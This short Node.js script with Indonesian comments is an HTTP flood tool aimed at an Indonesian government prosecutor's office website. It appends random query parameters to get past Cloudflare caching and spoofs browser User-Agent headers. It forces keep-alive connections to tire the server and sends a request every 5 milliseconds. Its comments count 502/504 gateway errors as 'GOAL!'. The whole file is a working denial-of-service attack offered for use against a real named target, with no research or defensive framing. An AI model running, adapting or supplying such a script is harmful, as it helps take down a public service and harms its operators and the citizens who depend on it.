const https = require('https');

// Target API - Kita tambahkan random parameter agar tidak di-cache oleh Cloudflare
const target = 'https://kejari-pali.kejaksaan.go.id/?s=' + Math.random().toString(36).substring(7);
function strike() {
    const options = {
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + Math.floor(Math.random() * 100) + '.0.0.0 Safari/537.36',
            'Accept': 'application/json', // Karena ini API
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive' // Maksa koneksi tetap terbuka biar server capek
        }
    };

    const req = https.request(target, options, (res) => {
        // Kita hanya pantau status, kalau 429 berarti kita kena limit, kalau 502/504 berarti GOAL!
        console.log(`[ 🌀 ] API Strike! | Status: ${res.statusCode}`);
    });

    req.on('error', (e) => {
        console.log(`[ ⚠️ ] API COLLAPSE: ${e.message}`);
    });

    req.end();
}

// Kecepatan ekstrem untuk API
setInterval(strike, 5); 
console.log("API OVERLOAD INITIATED: Hantam jantung NvidiaBotz...");
